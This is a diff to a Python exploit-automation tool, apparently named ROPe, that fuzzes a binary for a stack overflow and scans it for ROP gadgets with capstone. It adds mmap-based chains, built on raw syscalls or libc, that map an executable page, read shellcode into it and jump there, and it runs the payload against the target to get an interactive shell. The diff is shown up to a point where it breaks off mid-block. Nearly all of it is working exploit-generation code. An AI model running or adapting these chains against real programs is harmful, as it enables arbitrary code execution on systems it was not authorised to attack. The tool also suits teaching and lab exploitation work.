@@ -15,6 +15,7 @@ import argparse
 import struct
 from subprocess import *
 import re
+import binascii
 from capstone import *
 from pwn import *
 
@@ -46,12 +47,16 @@ gadget_map = {}
 has_libc = True
 libc_addr = None
 buflen = 0
-bufaddr = None
+#bufaddr = None
 mprotect_addr = None
+mmap_addr = None
+memcpy_addr = None
 sc_addr = None
 verbose = False
 disable_exec = False
 disable_file_output = False
+target_ropchain = None
+
 
 # pretty colors
 class Colors:
@@ -87,16 +92,12 @@ def find_buffer_length(f):
             stdout = proc.communicate(input=bytes(buf.encode('ascii')))
         except TimeoutExpired:
             proc.kill()
-        #proc = process([f])
-        #proc.sendline(buf)
-        #proc.recvall()
 
         if proc.returncode == -11:
             debug(f"found overflow length: {len(buf)}")
             found = True
             break
         buf += "A"
-        #proc.close()
 
     if found is False:
         return -1
@@ -104,46 +105,46 @@ def find_buffer_length(f):
 
 
 # Determines the address of the buffer
-def find_buffer_addr(f):
-    # since ASLR is disabled, we should be able to write a small program
-    # using the known information about the size/length of the buffer
-    # before it overflows, then print out that addr for the buffer
-    # in a dummy program
-    try:
-        buf_addr_prog = open("./find-vuln-buf.c", "w+")
-        buf_addr_prog.write(
-                "#include <stdio.h>\n" +
-                "#include <string.h>\n" +
-                "\n" +
-                "int main(int argc, char *argv[])\n" +
-                "{\n" +
-                f"    char buf[{buflen-8}];\n" +
-                "    printf(\"%p\", buf);\n" +
-                "    return 0;\n" +
-                "}")
-        buf_addr_prog.close()
-        
-        gcc = subprocess.Popen(["gcc", "-fno-stack-protector", "-g", "-o", "find-vuln-buf", "find-vuln-buf.c"], stdout=PIPE, stderr=PIPE)
-        try:
-            stdout, stderr = gcc.communicate(timeout=5)
-        except TimeoutExpired:
-            gcc.kill()
-            stdout, stderr = gcc.communicate()
-
-        bufproc = subprocess.Popen(["./find-vuln-buf"], stdout=PIPE, stderr=PIPE)
-        bufaddr = None
-        try:
-            stdout, stderr = bufproc.communicate(timeout=5)
-            bufaddr = stdout
-        except TimeoutExpired:
-            bufproc.kill()
-
-        subprocess.Popen(["rm", "-rf", "find-vuln-buf.c", "find-vuln-buf"])
-        return bufaddr
-
-    except Exception as err:
-        print(f"{Colors.BOLD}{Colors.RED}Failed to write file: {err}{Colors.GREY}{Colors.RESET}")
-        return None
+#def find_buffer_addr(f):
+#    # since ASLR is disabled, we should be able to write a small program
+#    # using the known information about the size/length of the buffer
+#    # before it overflows, then print out that addr for the buffer
+#    # in a dummy program
+#    try:
+#        buf_addr_prog = open("./find-vuln-buf.c", "w+")
+#        buf_addr_prog.write(
+#                "#include <stdio.h>\n" +
+#                "#include <string.h>\n" +
+#                "\n" +
+#                "int main(int argc, char *argv[])\n" +
+#                "{\n" +
+#                f"    char buf[{buflen-8}];\n" +
+#                "    printf(\"%p\", buf);\n" +
+#                "    return 0;\n" +
+#                "}")
+#        buf_addr_prog.close()
+#        
+#        gcc = subprocess.Popen(["gcc", "-fno-stack-protector", "-g", "-o", "find-vuln-buf", "find-vuln-buf.c"], stdout=PIPE, stderr=PIPE)
+#        try:
+#            stdout, stderr = gcc.communicate(timeout=5)
+#        except TimeoutExpired:
+#            gcc.kill()
+#            stdout, stderr = gcc.communicate()
+#
+#        bufproc = subprocess.Popen(["./find-vuln-buf"], stdout=PIPE, stderr=PIPE)
+#        bufaddr = None
+#        try:
+#            stdout, stderr = bufproc.communicate(timeout=5)
+#            bufaddr = stdout
+#        except TimeoutExpired:
+#            bufproc.kill()
+#
+#        subprocess.Popen(["rm", "-rf", "find-vuln-buf.c", "find-vuln-buf"])
+#        return bufaddr
+#
+#    except Exception as err:
+#        print(f"{Colors.BOLD}{Colors.RED}Failed to write file: {err}{Colors.GREY}{Colors.RESET}")
+#        return None
 
 
 # Small helper function to print a gadget in human-readable format
@@ -207,6 +208,23 @@ def build_gadgets(elfname, baseaddr):
             
         # check if the gadgets found are unique, and add them to the global map if so
         for g_addr in gadgets:
+            #if b'\x0a' in bytes(g_addr) or b'\x0d' in bytes(g_addr):
+            #    print(f"rejecting {g_addr} due to bad bytes")
+            #    continue
+
+            # does the address of the gadget contain 0x0a or 0x0d?
+            
+            #if ~g_addr ^ 0x0a == 0x0a or ~g_addr ^ 0x0a00 == 0x0a00 or ~g_addr ^ 0x0a0000 == 0x0a0000 or ~g_addr ^ 0x0a000000 == 0x0a000000:
+            s_addr = g_addr.to_bytes(8, byteorder='little', signed=False)
+            if b'\x0a' in s_addr:
+                debug(f"rejecting {hex(g_addr)} due to {Colors.YELLOW}0x0a{Colors.GREY} byte")
+                continue
+
+            #if ~g_addr ^ 0x0d == 0x0d or ~g_addr ^ 0x0d00 == 0x0d00 or ~g_addr ^ 0x0d0000 == 0x0d0000 or ~g_addr ^ 0x0d000000 == 0x0d000000:
+            if b'\x0d' in s_addr:
+                debug(f"rejecting {hex(g_addr)} due to {Colors.YELLOW}0x0d{Colors.GREY} byte")
+                continue
+
             if gadgets[g_addr] not in gadget_map.values():
                 md = Cs(CS_ARCH_X86, CS_MODE_64)
                 md.detail = False
@@ -396,8 +414,8 @@ def find_add_rax_1_ret():
     debug(f"no suitable {Colors.BOLD}{Colors.CYAN}add  rax, 1; ret;{Colors.GREY} gadget found!{Colors.RESET}")
     return None
 
-# `pop rdx; ret;`
-def find_pop_rdx_ret():
+# Looks for `pop r8; ret;` gadget, returning an address if found, or None if not found
+def find_pop_r8_ret():
     global gadget_map
     for g_addr in gadget_map:
         md = Cs(CS_ARCH_X86, CS_MODE_64)
@@ -406,13 +424,333 @@ def find_pop_rdx_ret():
         instr_list = list(md.disasm(g, g_addr))
 
         if len(instr_list) == 2:
-            if instr_list[0] == "pop" and instr_list[0].op_stry == "rdx" and instr_list[1].mnemonic == ret:
-                debug(f"found suitable {Colors.BOLD}{Colors.CYAN}pop rdx; ret;{Colors.GREY} gadget @ {Colors.YELLOW}{hex(g_addr)}{Colors.GREY}{Colors.RESET}")
+            if instr_list[0].mnemonic == "pop" and instr_list[0].op_str == "r8" and instr_list[1].mnemonic == "ret":
+                debug(f"found suitable {Colors.BOLD}{Colors.CYAN}pop r8; ret;{Colors.GREY} gadget @ {Colors.YELLOW}{hex(g_addr)}{Colors.GREY}{Colors.RESET}")
                 return g_addr
-    debug(f"no suitable {Colors.BOLD}{Colors.CYAN}pop rdx; ret;{Colors.GREY} gadget found!{Colors.RESET}")
+    debug(f"no suitable {Colors.BOLD}{Colors.CYAN}pop r8; ret;{Colors.GREY} gadget found!{Colors.RESET}")
     return None
 
+
+# Looks for `pop r9; ret;` gadget, returning an address if found, or None if not found
+def find_pop_r9_ret():
+    global gadget_map
+    for g_addr in gadget_map:
+        md = Cs(CS_ARCH_X86, CS_MODE_64)
+        md.detail = False
+        g = gadget_map[g_addr]
+        instr_list = list(md.disasm(g, g_addr))
+
+        if len(instr_list) == 2:
+            if instr_list[0].mnemonic == "pop" and instr_list[0].op_str == "r9" and instr_list[1].mnemonic == "ret":
+                debug(f"found suitable {Colors.BOLD}{Colors.CYAN}pop r9; ret;{Colors.GREY} gadget @ {Colors.YELLOW}{hex(g_addr)}{Colors.GREY}{Colors.RESET}")
+                return g_addr
+    debug(f"no suitable {Colors.BOLD}{Colors.CYAN}pop r9; ret;{Colors.GREY} gadget found!{Colors.RESET}")
+    return None
+
+
+# Looks for `pop r10; ret;` gadget, returning an address if found, or None if not found
+def find_pop_r10_ret():
+    global gadget_map
+    for g_addr in gadget_map:
+        md = Cs(CS_ARCH_X86, CS_MODE_64)
+        md.detail = False
+        g = gadget_map[g_addr]
+        instr_list = list(md.disasm(g, g_addr))
+
+        if len(instr_list) == 2:
+            if instr_list[0].mnemonic == "pop" and instr_list[0].op_str == "r10" and instr_list[1].mnemonic == "ret":
+                debug(f"found suitable {Colors.BOLD}{Colors.CYAN}pop r10; ret;{Colors.GREY} gadget @ {Colors.YELLOW}{hex(g_addr)}{Colors.GREY}{Colors.RESET}")
+                return g_addr
+    debug(f"no suitable {Colors.BOLD}{Colors.CYAN}pop r10; ret;{Colors.GREY} gadget found!{Colors.RESET}")
+    return None
+
+
+# Looks for `mov qword ptr [rsp + 8], r12; ret;` gadget, returning an address if found, or None if not found
+def find_mov_from_r12_ret():
+    global gadget_map
+    for g_addr in gadget_map:
+        md = Cs(CS_ARCH_X86, CS_MODE_64)
+        md.detail = False
+        g = gadget_map[g_addr]
+        instr_list = list(md.disasm(g, g_addr))
+
+        if len(instr_list) == 2:
+            if instr_list[0].mnemonic == "mov" and instr_list[0].op_str == "qword ptr [rsp + 8], r12" and instr_list[1].mnemonic == "ret":
+                debug(f"found suitable {Colors.BOLD}{Colors.CYAN}mov qword ptr [rsp + 8], r12; ret;{Colors.GREY} gadget @ {Colors.YELLOW}{hex(g_addr)}{Colors.GREY}{Colors.RESET}")
+                return g_addr
+    debug(f"no suitable {Colors.BOLD}{Colors.CYAN}mov qword ptr [rsp + 8], r12; ret;{Colors.GREY} gadget found!{Colors.RESET}")
+    return None
+
+
+# Looks for `xchg rax, r12; ret;` gadget, returning an address if found, or None if not found
+def find_xchg_rax_r12_ret():
+    global gadget_map
+    for g_addr in gadget_map:
+        md = Cs(CS_ARCH_X86, CS_MODE_64)
+        md.detail = False
+        g = gadget_map[g_addr]
+        instr_list = list(md.disasm(g, g_addr))
+
+        if len(instr_list) == 2:
+            if instr_list[0].mnemonic == "xchg" and instr_list[0].op_str == "rax, r12" and instr_list[1].mnemonic == "ret":
+                debug(f"found suitable {Colors.BOLD}{Colors.CYAN}xchg rax, r12; ret;{Colors.GREY} gadget @ {Colors.YELLOW}{hex(g_addr)}{Colors.GREY}{Colors.RESET}")
+                return g_addr
+    debug(f"no suitable {Colors.BOLD}{Colors.CYAN}xchg rax, r12; ret;{Colors.GREY} gadget found!{Colors.RESET}")
+    return None
+    
+
+# Looks for `push r12; ret;` gadget, returning an address if found, or None if not found
+def find_push_r12_ret():
+    global gadget_map
+    for g_addr in gadget_map:
+        md = Cs(CS_ARCH_X86, CS_MODE_64)
+        md.detail = False
+        g = gadget_map[g_addr]
+        instr_list = list(md.disasm(g, g_addr))
+
+        if len(instr_list) == 2:
+            if instr_list[0].mnemonic == "push" and instr_list[0].op_str == "r12" and instr_list[1].mnemonic == "ret":
+                debug(f"found suitable {Colors.BOLD}{Colors.CYAN}push r12; ret;{Colors.GREY} gadget @ {Colors.YELLOW}{hex(g_addr)}{Colors.GREY}{Colors.RESET}")
+                return g_addr
+    debug(f"no suitable {Colors.BOLD}{Colors.CYAN}push r12; ret;{Colors.GREY} gadget found!{Colors.RESET}")
+    return None
+    
+
+# Looks for `ret;` gadget, returning an address if found, or None if not found
+def find_ret():
+    global gadget_map
+    for g_addr in gadget_map:
+        md = Cs(CS_ARCH_X86, CS_MODE_64)
+        md.detail = False
+        g = gadget_map[g_addr]
+        instr_list = list(md.disasm(g, g_addr))
+
+        if len(instr_list) == 1:
+            if instr_list[0].mnemonic == "ret":
+                debug(f"found suitable {Colors.BOLD}{Colors.CYAN}ret;{Colors.GREY} gadget @ {Colors.YELLOW}{hex(g_addr)}{Colors.GREY}{Colors.RESET}")
+                return g_addr
+    debug(f"no suitable {Colors.BOLD}{Colors.CYAN}ret;{Colors.GREY} gadget found!{Colors.RESET}")
+    return None
+    
+
+# Looks for `pop rcx; ret;` gadget, returning an address if found, or None if not found
+def find_pop_rcx_ret():
+    global gadget_map
+    for g_addr in gadget_map:
+        md = Cs(CS_ARCH_X86, CS_MODE_64)
+        md.detail = False
+        g = gadget_map[g_addr]
+        instr_list = list(md.disasm(g, g_addr))
+
+        if len(instr_list) == 2:
+            if instr_list[0].mnemonic == "pop" and instr_list[0].op_str == "rcx" and instr_list[1].mnemonic == "ret":
+                debug(f"found suitable {Colors.BOLD}{Colors.CYAN}pop rcx; ret;{Colors.GREY} gadget @ {Colors.YELLOW}{hex(g_addr)}{Colors.GREY}{Colors.RESET}")
+                return g_addr
+    debug(f"no suitable {Colors.BOLD}{Colors.CYAN}pop rcx; ret;{Colors.GREY} gadget found!{Colors.RESET}")
+    return None
+
+
 ############################### CHAIN BUILDERS ################################
+
+# Attempts to build the syscall-mmap chain
+def build_syscall_mmap(f):
+    # Here we try to `mmap(ADDR, LENGTH, R|W|X, MAP_SHARED | MAP_ANONYMOUS, FD, OFFSET)` via system call
+    #                      rdi   rsi     rdx              r10               r8   r9
+    #                                    0x7    0x01       | 0x20           -1   0    
+    # rax gets return value of mmap syscall
+    #
+    # Followed by a read() into that area
+    # Followed by a return into that read shellcode
+
+    global buflen
+    global sc_addr
+
+    # Find required gadgets
+    syscall = find_syscall_ret()
+    pop_rdi = find_pop_rdi_ret()
+    pop_rsi = find_pop_rsi_ret()
+    pop_r8  = find_pop_r8_ret()
+    pop_r9  = find_pop_r9_ret()
+    pop_r10 = find_pop_r10_ret()
+    pop_rdx = find_pop_rdx_ret()
+
+    add_rax_1   = find_add_rax_1_ret()
+    xor_rax_rax = find_xor_rax_rax_ret()
+    pop_r12_pr  = find_pop_r12_pr()
+    mov_rdx_r12_ppr = find_mov_rdx_r12_ppr()
+    
+    xchg_rax_r12 = find_xchg_rax_r12_ret()
+    mov_from_r12 = find_mov_from_r12_ret()
+
+    ret = find_ret()
+
+    if (syscall is None) or (pop_rdi is None) or (pop_rsi is None) or (pop_rdx is None and pop_r12_pr is None and mov_rdx_r12_ppr is None) or \
+            (pop_r10 is None) or (pop_r8 is None) or (pop_r9 is None) or (xchg_rax_r12 is None) or (xor_rax_rax is None) or (mov_from_r12 is None) or \
+            (ret is None) or (add_rax_1 is None):
+        print(f"{Colors.BOLD}{Colors.RED}Insufficient gadgets found for this chain!{Colors.GREY}{Colors.RESET}")
+        return None
+
+    payload  = b'A' * buflen        # padding
+
+    payload += p64(xor_rax_rax)        # rax = 0
+    payload += p64(add_rax_1) * 9      # rax = 9
+
+    # First the mmap call
+    payload += p64(pop_rdi)         # 1st arg
+    payload += p64(0x0)             # 0
+    payload += p64(pop_rsi)         # 2nd arg
+    payload += p64(0x1000)          # 4kb (pagesize)
+    if pop_rdx is not None:
+        payload += p64(pop_rdx)
+        payload += p64(0x7)
+    else:
+        payload += p64(pop_r12_pr)      # 
+        payload += p64(0x7)             # R|W|X
+        payload += p64(PLACEHOLDER)     # for 2nd pop in pop_r12_pr
+        payload += p64(mov_rdx_r12_ppr) # 3rd arg, rdx = 0x7
+        payload += p64(PLACEHOLDER)    # needed for the extra ppr in mov_rdx_r12_ppr
+        payload += p64(PLACEHOLDER)    # needed for the extra ppr in mov_rdx_r12_ppr
+    payload += p64(pop_r10)         # 4th arg
+    payload += p64(0x21)            # MAP_SHARED | MAP_ANONYMOUS
+    payload += p64(pop_r8)          # 5th arg
+    payload += p64(0xffffffffffffffff)      # -1
+    payload += p64(pop_r9)          # 6th arg
+    payload += p64(0x0)             # 0
+    payload += p64(syscall)
+
+    # save rax for later
+    payload += p64(xchg_rax_r12)
+
+    # Then the read call
+    payload += p64(xor_rax_rax)        # rax = 0
+    payload += p64(pop_rdi)            # 1st arg
+    payload += p64(0x0)                # fd0 (stdin)
+    payload += p64(mov_from_r12)
+    payload += p64(pop_rsi)            # 2nd arg
+    payload += p64(PLACEHOLDER)        # address to write into
+    if pop_rdx is not None:
+        payload += p64(pop_rdx)
+        payload += p64(0x1000)
+    else:
+        payload += p64(pop_r12_pr)         # r12 = 4kb
+        payload += p64(0x1000)             # 4kb
+        payload += p64(PLACEHOLDER)        # needed for the extra pr in pop_r12_pr
+        payload += p64(mov_rdx_r12_ppr)    # rdx = r12 = 4kb
+        payload += p64(PLACEHOLDER)   # needed for the extra ppr in mov_rdx_r12_ppr
+        payload += p64(PLACEHOLDER)   # needed for the extra ppr in mov_rdx_r12_ppr
+    payload += p64(syscall)            # syscall
+
+    # Then return into the new RWX page
+    payload += p64(mov_from_r12)
+    payload += p64(ret)
+    payload += p64(PLACEHOLDER)
+
+    return payload
+
+
+# Attempts to build the libc-mprotect chain
+def build_libc_mmap(f):
+    # Here we try to `mmap(ADDR, LENGTH, R|W|X, MAP_SHARED | MAP_ANONYMOUS, FD, OFFSET)` via library call
+    #                      rdi   rsi     rdx              r10               r8   r9
+    #                                    0x7    0x01       | 0x20           -1   0    
+    # rax gets return value of mmap syscall
+    #
+    # Followed by a read() into that area
+    # Followed by a return into that read shellcode
+
+    global buflen
+    global libc_addr
+    global mmap_addr
+
+    if mmap_addr is None:
+        print(f"{Colors.BOLD}{Colors.RED}Unable to leak address of mmap in libc!{Colors.GREY}{Colors.RESET}")
+        return None
+
+    debug(f"{Colors.RESET}{Colors.GREY}libc base addr @ {Colors.YELLOW}{hex(libc_addr)}{Colors.GREY}")
+    debug(f"{Colors.RESET}{Colors.GREY}mmap @ {Colors.YELLOW}{hex(mmap_addr)}{Colors.GREY}")
+
+    # Find required gadgets
+    syscall = find_syscall_ret()
+    pop_rdi = find_pop_rdi_ret()
+    pop_rsi = find_pop_rsi_ret()
+    pop_r8  = find_pop_r8_ret()
+    pop_r9  = find_pop_r9_ret()
+    pop_r10 = find_pop_r10_ret()
+    pop_rdx = find_pop_rdx_ret()
+    pop_rcx = find_pop_rcx_ret()
+
+    add_rax_1   = find_add_rax_1_ret()
+    xor_rax_rax = find_xor_rax_rax_ret()
+    pop_r12_pr  = find_pop_r12_pr()
+    mov_rdx_r12_ppr = find_mov_rdx_r12_ppr()
+    
+    xchg_rax_r12 = find_xchg_rax_r12_ret()
+    mov_from_r12 = find_mov_from_r12_ret()
+
+    ret = find_ret()
+
+    if (syscall is None) or (pop_rdi is None) or (pop_rsi is None) or (pop_rdx is None and pop_r12_pr is None and mov_rdx_r12_ppr is None) or \
+            (pop_r10 is None) or (pop_r8 is None) or (pop_r9 is None) or (xchg_rax_r12 is None) or (xor_rax_rax is None) or (mov_from_r12 is None) or \
+            (ret is None) or (pop_rcx is None) or (add_rax_1 is None):
+        print(f"{Colors.BOLD}{Colors.RED}Insufficient gadgets found for this chain!{Colors.GREY}{Colors.RESET}")
+        return None
+
+    payload  = b'A' * buflen        # padding
+
+    # First the mmap call
+    payload += p64(pop_rdi)         # 1st arg
+    payload += p64(0x0)             # 0
+    payload += p64(pop_rsi)         # 2nd arg
+    payload += p64(0x1000)          # 4kb (pagesize)
+    if pop_rdx is not None:
+        payload += p64(pop_rdx)
+        payload += p64(0x7)
+    else:
+        payload += p64(pop_r12_pr)      # 
+        payload += p64(0x7)             # R|W|X
+        payload += p64(PLACEHOLDER)     # for 2nd pop in pop_r12_pr
+        payload += p64(mov_rdx_r12_ppr) # 3rd arg, rdx = 0x7
+        payload += p64(PLACEHOLDER)    # needed for the extra ppr in mov_rdx_r12_ppr
+        payload += p64(PLACEHOLDER)    # needed for the extra ppr in mov_rdx_r12_ppr
+    payload += p64(pop_r10)         # 4th arg
+    payload += p64(0x21)            # MAP_SHARED | MAP_ANONYMOUS
+    payload += p64(pop_rcx)         # why does glibc's mmap move rcx->r10? so weird.
+    payload += p64(0x21)
+    payload += p64(pop_r8)          # 5th arg
+    payload += p64(0xffffffffffffffff)      # -1
+    payload += p64(pop_r9)          # 6th arg
+    payload += p64(0x0)             # 0
+    payload += p64(mmap_addr)
+
+    # save rax for later
+    payload += p64(xchg_rax_r12)
+
+    # Then the read call
+    payload += p64(xor_rax_rax)        # rax = 0
+    payload += p64(pop_rdi)            # 1st arg
+    payload += p64(0x0)                # fd0 (stdin)
+    payload += p64(mov_from_r12)
+    payload += p64(pop_rsi)            # 2nd arg
+    payload += p64(PLACEHOLDER)        # address to write into
+    if pop_rdx is not None:
+        payload += p64(pop_rdx)
+        payload += p64(0x1000)
+    else:
+        payload += p64(pop_r12_pr)         # r12 = 4kb
+        payload += p64(0x1000)             # 4kb
+        payload += p64(PLACEHOLDER)        # needed for the extra pr in pop_r12_pr
+        payload += p64(mov_rdx_r12_ppr)    # rdx = r12 = 4kb
+        payload += p64(PLACEHOLDER)   # needed for the extra ppr in mov_rdx_r12_ppr
+        payload += p64(PLACEHOLDER)   # needed for the extra ppr in mov_rdx_r12_ppr
+    payload += p64(syscall)            # syscall
+
+    # Then return into the new RWX page
+    payload += p64(mov_from_r12)
+    payload += p64(ret)
+    payload += p64(PLACEHOLDER)
+
+    return payload
+
 
 # Attempts to build the syscall-mprotect chain
 def build_syscall_mprotect(f):
@@ -422,9 +760,6 @@ def build_syscall_mprotect(f):
 
     global buflen
     global sc_addr
-    global libc_addr
-
-    debug(f"libc base addr @ {Colors.YELLOW}{hex(libc_addr)}{Colors.GREY}")
 
     syscall = find_syscall_ret() # addr of syscall gadget
     pop_rax = find_pop_rax_ret() # syscall number, should be 0xa (10) for mprotect
@@ -439,7 +774,8 @@ def build_syscall_mprotect(f):
     xor_rax_rax = find_xor_rax_rax_ret() # rax = 0
     add_rax_1 = find_add_rax_1_ret()     # used to increment rax to the correct syscall number
 
-    if syscall is None or pop_rax is None or pop_rdi is None or pop_rsi is None or pop_r12_pr is None or (mov_rdx_r12_ppr is None and pop_rdx is None) or xor_rax_rax is None or add_rax_1 is None:
+    if (xor_rax_rax is None) or (add_rax_1 is None) or (pop_rdi is None) or (sc_addr is None) or (pop_rsi is None) or \
+            (pop_rdx is None and pop_r12_pr is None and mov_rdx_r12_ppr is None) or (syscall is None) or (pop_rdx is None):
         print(f"{Colors.BOLD}{Colors.RED}Insufficient gadgets found for this chain!{Colors.GREY}{Colors.RESET}")
         return None
 
@@ -486,69 +822,6 @@ def build_syscall_mprotect(f):
     return payload
 
 
-# Attempts to build the syscall-mmap chain
-#def build_syscall_mmap(f):
-#    # Here we try to `mmap(ADDR, LENGTH, R|W|X, MAP_SHARED | MAP_ANONYMOUS, FD, OFFSET)` via system call
-#    #                      rdi   rsi     rdx              r10               r8   r9
-#    #                                    0x7    0x01       | 0x20           -1     0    
-#    # rax gets return value of mmap syscall
-#    #
-#    # Followed by a read() into that area
-#    # Followed by a return into that read shellcode
-#
-#    global buflen
-#    global sc_addr
-#    global libc_addr
-#
-#    # Find required gadgets
-#    syscall = find_syscall_ret()
-#    pop_rdi = find_pop_rdi_ret()
-#    pop_rsi = find_pop_rsi_ret()
-#
-#
-#    xor_rax_rax = find_xor_rax_rax_ret()
-#    pop_r12_pr  = find_pop_r12_pr()
-#    mov_rdx_r12_ppr = find_mov_rdx_r12_ppr()
-#
-#    payload  = b'A' * buflen        # padding
-#
-#    # First the mmap call
-#    payload += p64(pop_rdi)         # 1st arg
-#    payload += p64(0x0)             # 0
-#    payload += p64(pop_rsi)         # 2nd arg
-#    payload += p64(0x1000)          # 4kb (pagesize)
-#    payload += p64(pop_r12_pr)      # 
-#    payload += p64(0x7)             # R|W|X
-#    payload += p64(PLACEHOLDER)     # for 2nd pop in pop_r12_pr
-#    payload += p64(mov_rdx_r12_ppr) # 3rd arg, rdx = 0x7
-#    payload += p64(PLACEHOLDER) * 2 # needed for the extra ppr in mov_rdx_r12_ppr
-#
-#    payload += p64(pop_r10)         # 4th arg
-#    payload += p64(0x21)            # MAP_SHARED | MAP_ANONYMOUS
-#    payload += p64(pop_r8)          # 5th arg
-#    payload += p64(0xffffffff)      # -1
-#    payload += p64(pop_r9)          # 6th arg
-#    payload += p64(0x0)             # 0
-#
-#    # save rax for later
-#
-#    # Then the read call
-#    payload += p64(xor_rax_rax)        # rax = 0
-#    payload += p64(pop_rdi)            # 1st arg
-#    payload += p64(0x0)                # fd0 (stdin)
-#    payload += p64(pop_rsi)            # 2nd arg
-#    payload += p64(sc_addr)            # address to write into
-#    payload += p64(pop_r12_pr)         # r12 = 4kb
-#    payload += p64(0x1000)             # 4kb
-#    payload += p64(PLACEHOLDER)        # needed for the extra pr in pop_r12_pr
-#    payload += p64(mov_rdx_r12_ppr)    # rdx = r12 = 4kb
-#    payload += p64(PLACEHOLDER) * 2    # needed for the extra ppr in mov_rdx_r12_ppr
-#    payload += p64(syscall)            # syscall
-#
-#    # Then return into the new RWX page
-#    return payload
-
-
 # Attemps to build the libc-mprotect chain
 def build_libc_mprotect(f):
     # our goal here is to `mprotect(ADDR, LEN, R|W|X)` via library call
@@ -559,6 +832,10 @@ def build_libc_mprotect(f):
     global sc_addr
     global libc_addr
     global mprotect_addr
+
+    if mprotect_addr is None:
+        print(f"{Colors.BOLD}{Colors.RED}Unable to leak address of mprotect in libc!{Colors.GREY}{Colors.RESET}")
+        return None
 
     debug(f"{Colors.RESET}{Colors.GREY}libc base addr @ {Colors.YELLOW}{hex(libc_addr)}{Colors.GREY}")
     debug(f"{Colors.RESET}{Colors.GREY}mprotect @ {Colors.YELLOW}{hex(mprotect_addr)}{Colors.GREY}")
@@ -629,17 +906,20 @@ def build_chain(filename):
     global has_libc
     global libc_addr
     global buflen
-    global bufaddr
+    #global bufaddr
     global mprotect_addr
+    global mmap_addr
+    global memcpy_addr
     global sc_addr
     global disable_exec
+    global target_ropchain
 
     # reset to defaults, in case this is for a non-first binary
     gadget_map = {}
     has_libc = True
     libc_addr = None
     buflen = 0
-    bufaddr = None
+    #bufaddr = None
     mprotect_addr = None
     sc_addr = None
 
@@ -673,6 +953,8 @@ def build_chain(filename):
             debug(f"libc base address @ {hex(libc_addr)}")
             libc = ELF(libname, checksec=False)
             mprotect_addr = libc_addr + libc.symbols['mprotect']
+            mmap_addr = libc_addr + libc.symbols['mmap']
+            memcpy_addr = libc_addr + libc.symbols['memcpy']
             debug(f"libc mprotect addr @ {hex(mprotect_addr)}")
 
         # Build the collection of gadgets
@@ -688,14 +970,16 @@ def build_chain(filename):
     print(f"Target buffer overflows at {Colors.BOLD}{Colors.GREEN}{buflen}{Colors.RESET}{Colors.GREY} bytes")
 
     # Determines the address of the buffer in memory
-    bufaddr = find_buffer_addr(filename)
-    if bufaddr is None:
-        print(f"{Colors.BOLD}{Colors.YELLOW}Unable to determine buffer address.{Colors.GREY}{Colors.RESET}")
-        return None
+    #bufaddr = find_buffer_addr(filename)
+    #if bufaddr is None:
+    #    print(f"{Colors.BOLD}{Colors.YELLOW}Unable to determine buffer address.{Colors.GREY}{Colors.RESET}")
+    #    return None
 
     # Try syscall-mprotect chain
     print(f"{Colors.BOLD}{Colors.GREY}Attempting {Colors.YELLOW}syscall-mprotect{Colors.GREY} chain...")
-    res = build_syscall_mprotect(filename)
+    res = None
+    if target_ropchain is None or target_ropchain == "1":
+        res = build_syscall_mprotect(filename)
     if res is not None:
         print(f"{Colors.BOLD}{Colors.WHITE}Successfully constructed {Colors.YELLOW}syscall-mprotect{Colors.WHITE} chain...{Colors.GREY}{Colors.RESET}")
         if disable_file_output is False:
@@ -703,34 +987,13 @@ def build_chain(filename):
             write_payload(f"{fn}-syscall-mprotect-payload.ROPe", res)
         if disable_exec is False:
             try:
-                print(f"{Colors.BOLD}{Colors.WHITE}*** Attempting ROP payload execution on {Colors.GREEN}{filename}{Colors.GREY}{Colors.RESET}")
+                print(f"{Colors.BOLD}{Colors.WHITE}*** Attempting ROP payload execution on {Colors.GREEN}{filename}{Colors.GREY}{Colors.RESET} (^D to exit shell)")
                 p = process([filename])
+                #p = process(["gdb", filename])
+                #p.sendline("break vuln.c:8")
+                #p.sendline("run")
                 p.sendline(bytes(res))
-                p.sendline(bytes(shellcode))
-                p.interactive()
-                p.close()
-            except Exception as err:
-                print(f"{Colors.BOLD}*** {Colors.RED}ERROR: {err}")
-
-
-
-    # Try libc-mprotect chain
-    print(f"{Colors.BOLD}{Colors.GREY}Attempting {Colors.YELLOW}libc-mprotect{Colors.GREY} chain...")
-    res = None
-    if has_libc is True:
-        res = build_libc_mprotect(filename)
-    else:
-        print(f"{Colors.BOLD}{Colors.RED}libc not found! Skipping chain...{Colors.RESET}{Colors.GREY}")
-    if res is not None:
-        print(f"{Colors.BOLD}{Colors.WHITE}Successfully constructed {Colors.YELLOW}libc-mprotect{Colors.WHITE} chain...{Colors.GREY}{Colors.RESET}")
-        if disable_file_output is False:
-            fn = filename[filename.rfind("/")+1:]
-            write_payload(f"{fn}-libc-mprotect-payload.ROPe", res)
-        if disable_exec is False:
-            try:
-                print(f"{Colors.BOLD}{Colors.WHITE}*** Attempting ROP payload execution on {Colors.GREEN}{filename}{Colors.GREY}{Colors.RESET}")
-                p = process([filename])
-                p.sendline(bytes(res))
+                #p.interactive()
                 p.sendline(bytes(shellcode))
                 p.interactive()
                 p.close()
@@ -738,22 +1001,95 @@ def build_chain(filename):
                 print(f"{Colors.BOLD}*** {Colors.RED}ERROR: {err}")
 
     # Try syscall-mmap chain
-    #print(f"{Colors.BOLD}{Colors.GREY}Attempting {Colors.YELLOW}syscall-mmap{Colors.GREY} chain...")
-    #res = build_syscall_mmap(filename)
-    #if res is not None:
-    #    print(f"{Colors.BOLD}{Colors.WHITE}Successfully constructed {Colors.YELLOW}syscall-mmap{Colors.WHITE} chain...{Colors.GREY}{Colors.RESET}")
-    #    write_payload(f"ROPe-syscall-mprotect-payload", res)
-    #    if disable_exec is False:
-    #        print(f"{Colors.BOLD}{Colors.WHITE}*** Executing {Colors.GREEN}{filename}{Colors.GREY}{Colors.RESET}")
-    #        p = process([filename])
-    #        p.sendline(bytes(res))
-    #        p.sendline(bytes(shellcode))
-    #        p.interactive()
+    print(f"{Colors.BOLD}{Colors.GREY}Attempting {Colors.YELLOW}syscall-mmap{Colors.GREY} chain...")
+    res = None
+    if target_ropchain is None or target_ropchain == "2":
+        res = build_syscall_mmap(filename)
+    if res is not None:
+        print(f"{Colors.BOLD}{Colors.WHITE}Successfully constructed {Colors.YELLOW}syscall-mmap{Colors.WHITE} chain...{Colors.GREY}{Colors.RESET}")
+        if disable_file_output is False:
+            fn = filename[filename.rfind("/")+1:]
+            write_payload(f"{fn}-syscall-mmap-payload.ROPe", res)
+        if disable_exec is False:
+            try:
